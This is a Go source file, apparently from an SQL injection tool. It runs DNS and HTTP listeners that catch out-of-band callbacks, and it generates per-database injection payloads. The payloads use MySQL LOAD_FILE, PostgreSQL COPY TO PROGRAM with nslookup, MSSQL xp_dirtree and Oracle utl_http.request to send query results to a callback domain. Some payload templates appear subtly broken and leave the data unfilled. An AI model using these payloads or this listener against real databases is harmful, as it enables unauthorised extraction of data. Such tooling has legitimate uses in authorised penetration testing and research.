package core

import (
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

type closeable interface {
	Close() error
}

type OOBListener struct {
	engine       *Engine
	dnsPort      int
	httpPort     int
	callbackHost string
	resources    []closeable
	receivedData []string
	mu           sync.Mutex
}

func NewOOBListener(engine *Engine, callbackHost string) *OOBListener {
	return &OOBListener{
		engine:       engine,
		dnsPort:      53,
		httpPort:     8080,
		callbackHost: callbackHost,
		receivedData: []string{},
	}
}

func (o *OOBListener) StartDNSListener() error {
	addr := fmt.Sprintf("0.0.0.0:%d", o.dnsPort)
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		return fmt.Errorf("DNS listener resolve: %v", err)
	}
	conn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		return fmt.Errorf("DNS listener start: %v", err)
	}
	o.resources = append(o.resources, conn)

	go func() {
		buf := make([]byte, 512)
		for {
			conn.SetReadDeadline(time.Now().Add(5 * time.Second))
			n, _, err := conn.ReadFromUDP(buf)
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					continue
				}
				return
			}
			data := string(buf[:n])
			if len(data) > 12 {
				payload := extractDNSSubdomain(data)
				if payload != "" {
					o.mu.Lock()
					o.receivedData = append(o.receivedData, payload)
					o.mu.Unlock()
					o.engine.logSuccess(fmt.Sprintf("OOB DNS callback received: %s", payload))
				}
			}
		}
	}()

	o.engine.logInfo(fmt.Sprintf("OOB DNS listener started on port %d", o.dnsPort))
	return nil
}

func (o *OOBListener) StartHTTPListener() error {
	addr := fmt.Sprintf("0.0.0.0:%d", o.httpPort)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("HTTP listener start: %v", err)
	}
	o.resources = append(o.resources, listener)

	go func() {
		for {
			listener.(*net.TCPListener).SetDeadline(time.Now().Add(3 * time.Second))
			conn, err := listener.Accept()
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					continue
				}
				return
			}
			buf := make([]byte, 1024)
			n, _ := conn.Read(buf)
			data := string(buf[:n])
			conn.Close()

			for _, line := range strings.Split(data, "\n") {
				if strings.Contains(line, "GET /") {
					parts := strings.Split(line, " ")
					if len(parts) >= 2 {
						path := parts[1]
						if len(path) > 3 {
							o.mu.Lock()
							o.receivedData = append(o.receivedData, path)
							o.mu.Unlock()
							o.engine.logSuccess(fmt.Sprintf("OOB HTTP callback: %s", path))
						}
					}
				}
			}
		}
	}()

	o.engine.logInfo(fmt.Sprintf("OOB HTTP listener started on port %d", o.httpPort))
	return nil
}

func (o *OOBListener) GetData() []string {
	o.mu.Lock()
	defer o.mu.Unlock()
	result := make([]string, len(o.receivedData))
	copy(result, o.receivedData)
	return result
}

func (o *OOBListener) Close() {
	for _, r := range o.resources {
		r.Close()
	}
}

func extractDNSSubdomain(data string) string {
	if len(data) < 12 {
		return ""
	}
	domainStart := 12
	if domainStart >= len(data) {
		return ""
	}
	var result strings.Builder
	for i := domainStart; i < len(data); {
		if i >= len(data) {
			break
		}
		labelLen := int(data[i])
		if labelLen == 0 {
			break
		}
		i++
		if i+labelLen > len(data) {
			break
		}
		if result.Len() > 0 {
			result.WriteByte('.')
		}
		for j := 0; j < labelLen && i+j < len(data); j++ {
			c := data[i+j]
			if c >= 32 && c <= 126 {
				result.WriteByte(c)
			}
		}
		i += labelLen
	}
	return result.String()
}

func (e *Engine) GenerateOOBPayload(param string, dbms string, callbackDomain string, data string) string {
	switch dbms {
	case "MySQL", "MariaDB":
		return fmt.Sprintf("' AND LOAD_FILE(CONCAT('\\\\\\\\',(%s),'.%s\\\\'))--", data, callbackDomain)
	case "PostgreSQL":
		return fmt.Sprintf("'; COPY (SELECT %s) TO PROGRAM 'nslookup %%s.%s'--", data, callbackDomain)
	case "MSSQL":
		return fmt.Sprintf("'; DECLARE @h VARCHAR(8000);SELECT @h='%%s.'+'%s';EXEC('master..xp_dirtree \"'+@h+'\"')--", callbackDomain)
	case "Oracle":
		return fmt.Sprintf("' OR utl_http.request('%s/'||(%s))--", callbackDomain, data)
	default:
		return fmt.Sprintf("' AND 1=0 UNION SELECT %s--", data)
	}
}
